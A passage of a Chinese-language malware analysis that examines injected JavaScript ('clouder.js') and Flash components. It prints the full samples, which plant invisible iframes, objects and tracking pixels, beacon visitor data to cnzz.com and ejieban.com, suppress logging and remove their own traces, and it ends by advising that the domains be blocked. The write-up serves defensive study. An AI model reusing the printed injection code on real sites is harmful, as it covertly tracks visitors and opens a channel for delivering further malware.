        l += "&amp;showp=" + sp + "&amp;st=0&amp;sin=&amp;t=&amp;rnd=" + Math.floor(2147483648 * Math.random());
        var img = '&lt;img src="' + l + '" width="0" height="0"/&gt;';
        return img
    `}`;
    _stat.st = function(l) `{`
        var id = "zz" + (new Date()).getTime();
        var h = _stat.zz('1743600', l || document.referrer);
        _stat.apdiv(id, h);
        setTimeout(function() `{`
            try `{`
                _stat.rm(id)
            `}` catch (e) `{``}`
        `}`, 1500)
    `}`
`}`)();
```

第二行是客户端IP和请求的来源国家（用中文表示）。



184.75.214.86_[Canada]:

[![](https://p5.ssl.qhimg.com/t0155ca7fa0844250a5.png)](https://p5.ssl.qhimg.com/t0155ca7fa0844250a5.png)

 第三行是由SWF、JavaScript文件、命令和回调URL组成的另一个数组。 解码后的stat.swf将使用fetchcallback（）函数处理该数据，并将其注入页面（见上文）。

** **

**需要关注的其他文件**

**hxxp://xxx.com/ssl/002735e0619ae0d8.swf：**

[![](https://p4.ssl.qhimg.com/t01fa337dcecb22676c.png)](https://p4.ssl.qhimg.com/t01fa337dcecb22676c.png)

这个SWF通过SharedObject API为浏览器提供get / set / remove功能。这将允许在同一页面中注入的Flash文件使用内存来共享数据，而不需要单独的服务器进行通信。

**hxxp://y3.xxx.com/ed787/0912/flashCookie.swf:**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0174d903ea496ec801.png)

它通过SharedObject API提供类似上面介绍的功能。

从stat.do收到的数据还引用了几个JavaScript文件，看起来像是提供更多的跟踪功能的。

**hxxp://b0.xxx.com/clouder.js, hxxp://i1.xxx.com/clouder.js,**

**hxxp://31.xxx.com/clouderx.js:**



```
if ("undefined" == typeof(_c1oud3r)) `{`  
    _c1oud3r = [];
    _c1oud3r.nodes = [];
    _c1oud3r._5c = false;
    _c1oud3r.pt = (("https:" == window.location.protocol) ? "https://" : "http://");
    _c1oud3r.appendChild = function(html, id) `{`
        var node = document.createElement("DIV");
        node.style.width = "0";
        node.style.height = "0";
        node.style.position = "absolute";
        node.style.left = "-100px";
        node.innerHTML = html;
        document.body.appendChild(node);
        _c1oud3r.nodes[id] = node
    `}`;
    _c1oud3r.removeNode = function(id) `{`
        try `{`
            if (_c1oud3r.nodes[id]) `{`
                document.body.removeChild(_c1oud3r.nodes[id]);
                _c1oud3r.nodes[id] = undefined
            `}`
        `}` catch (e) `{``}`
    `}`;
    _c1oud3r.removeIt = function() `{`
        if (_c1oud3r._5c) `{`
            setTimeout("_c1oud3r.removeNode('_cl3r')", 1200)
        `}` else `{`
            setTimeout(_c1oud3r.removeIt, 1000)
        `}`
    `}`;
    _c1oud3r.stat = function(id, r) `{`
        var l = _c1oud3r.pt + "hzs11.cnzz.com/stat.htm?id=";
        l += id + "&amp;r=" + encodeURIComponent(r) + "&amp;lg=";
        var f = window;
        var lg = f.navigator.systemLanguage || f.navigator.language;
        l += lg.toLowerCase() + "&amp;ntime=none&amp;repeatip=0&amp;rtime=0&amp;cnzz_eid=";
        l += Math.floor(2147483648 * Math.random()) + "-1395926171-";
        var sp = f.screen.width &amp;&amp; f.screen.height ? f.screen.width + "x" + f.screen.height : "0x0";
        l += "&amp;showp=" + sp + "&amp;st=0&amp;sin=&amp;t=&amp;rnd=" + Math.floor(2147483648 * Math.random());
        return l
    `}`;
    _c1oud3r.kbehavi = function() `{`
        if ("undefined" != typeof(LogHub) &amp;&amp; "undefined" != typeof(LogHub.behavior)) `{`
            LogHub.sbehavior = LogHub.behavior;
            LogHub.behavior = function(t, n) `{`
                if (/ewiewan.wom/i.test(n)) return;
                LogHub.sbehavior(t, n)
            `}`
        `}` else `{`
            setTimeout(_c1oud3r.kbehavi, 200)
        `}`
    `}`;
    _c1oud3r.oload = function() `{`
        if (document.body == null) `{`
            setTimeout(_c1oud3r.oload, 200)
        `}` else `{`
            var fp = _c1oud3r.pt + "s0.ejieban.com/stat.swf?d=17.swf";
            var pm = "f=3h&amp;u=" + window.navigator.userAgent;
            if ("undefined" != typeof(__scode)) `{`
                pm += "&amp;" + __scode
            `}`
            var str = '&lt;object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase=' + _c1oud3r.pt + 'fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0" width="0" height="0"&gt;&lt;param name="allowScriptAccess" value="always"/&gt;&lt;param name="movie" value="' + fp + '"/&gt;&lt;param name="flashVars" value="' + pm + '"/&gt;&lt;embed src="' + fp + '" flashVars="' + pm + '" width="0" height="0" allowScriptAccess="always" type="application/x-shockwave-flash" pluginspage="' + _c1oud3r.pt + 'www.macromedia.com/go/getflashplayer" /&gt;&lt;/object&gt;';
            str += '&lt;img src="' + _c1oud3r.stat("1806840", document.referrer) + '" width="0" height="0"/&gt;';
            _c1oud3r.appendChild(str, "_cl3r");
            setTimeout(_c1oud3r.removeIt, 2000)
        `}`
    `}`;
    try `{`
        if ("complete" == document.readyState) `{`
            _c1oud3r.oload()
        `}` else `{`
            if (document.attachEvent) `{`
                window.attachEvent("onload", _c1oud3r.oload)
            `}` else `{`
                window.addEventListener("load", _c1oud3r.oload, false)
            `}`
        `}`
    `}` catch (e) `{``}`
    _c1oud3r.kbehavi()
`}`
// "clouder" sample 2
if ("undefined" == typeof(_c1oud3r)) `{`  
    _c1oud3r = [];
    _c1oud3r.nodes = [];
    _c1oud3r.pt = (("https:" == window.location.protocol) ? "https://" : "http://");
    _c1oud3r.appendChild = function(html, id) `{`
        var node = document.createElement("DIV");
        node.style.width = "0";
        node.style.height = "0";
        node.style.position = "absolute";
        node.style.left = "-100px";
        node.innerHTML = html;
        document.body.appendChild(node);
        _c1oud3r.nodes[id] = node
    `}`;
    _c1oud3r.removeNode = function(id) `{`
        try `{`
            if (_c1oud3r.nodes[id]) `{`
                document.body.removeChild(_c1oud3r.nodes[id]);
                _c1oud3r.nodes[id] = undefined
            `}`
        `}` catch (e) `{``}`
    `}`;
    _c1oud3r.removeScript = function() `{`
        var head = document.getElementsByTagName('HEAD')[0];
        var ss = head.getElementsByTagName('SCRIPT');
        var re = new RegExp("//[^/]*\.ejieban\.com/", "i");
        for (var i = (ss.length - 1); i &gt;= 0; i--) `{`
            if (re.test(ss[i].src)) `{`
                head.removeChild(ss[i])
            `}`
        `}`
    `}`;
    _c1oud3r.stat = function(id, r) `{`
        var l = _c1oud3r.pt + "hzs11.cnzz.com/stat.htm?id=";
        l += id + "&amp;r=" + encodeURIComponent(r) + "&amp;lg=";
        var f = window;
        var lg = f.navigator.systemLanguage || f.navigator.language;
        l += lg.toLowerCase() + "&amp;ntime=none&amp;repeatip=0&amp;rtime=0&amp;cnzz_eid=";
        l += Math.floor(2147483648 * Math.random()) + "-1395926171-";
        var sp = f.screen.width &amp;&amp; f.screen.height ? f.screen.width + "x" + f.screen.height : "0x0";
        l += "&amp;showp=" + sp + "&amp;st=0&amp;sin=&amp;t=&amp;rnd=" + Math.floor(2147483648 * Math.random());
        return l
    `}`;
    _c1oud3r.oload = function() `{`
        if (document.body == null) `{`
            setTimeout(_c1oud3r.oload, 200)
        `}` else `{`
            var str = '&lt;img src="' + _c1oud3r.stat("1568238", document.referrer) + '" width="0" height="0"/&gt;';
            _c1oud3r.appendChild(str, "_cl3r");
            _c1oud3r.removeScript();
            setTimeout("_c1oud3r.removeNode('_cl3r')", 2000)
        `}`
    `}`;
    try `{`
        if ("complete" == document.readyState) `{`
            _c1oud3r.oload()
        `}` else `{`
            if (document.attachEvent) `{`
                window.attachEvent("onload", _c1oud3r.oload)
            `}` else `{`
                window.addEventListener("load", _c1oud3r.oload, false)
            `}`
        `}`
    `}` catch (e) `{``}`
`}`
```

**<br style="text-align: left">**

**结论**



这个恶意软件好像没有打算提权或下载PE有效载荷。它的主要目的似乎是使用&lt;script&gt;，&lt;img&gt;，Flash &lt;object&gt;注入来跟踪cnzz.com和ejieban.com。

需要注意的是，由于它能够注入任意Flash和JavaScript数据，所以它完全可以传递EK或其他恶意软件。理论上来说，其跟踪功能针对特定的国家、IP范围或其收集的任何其他元数据的客户端。

最后，阻止上述域名看起来是个不错的主意。 

<br style="text-align: left">
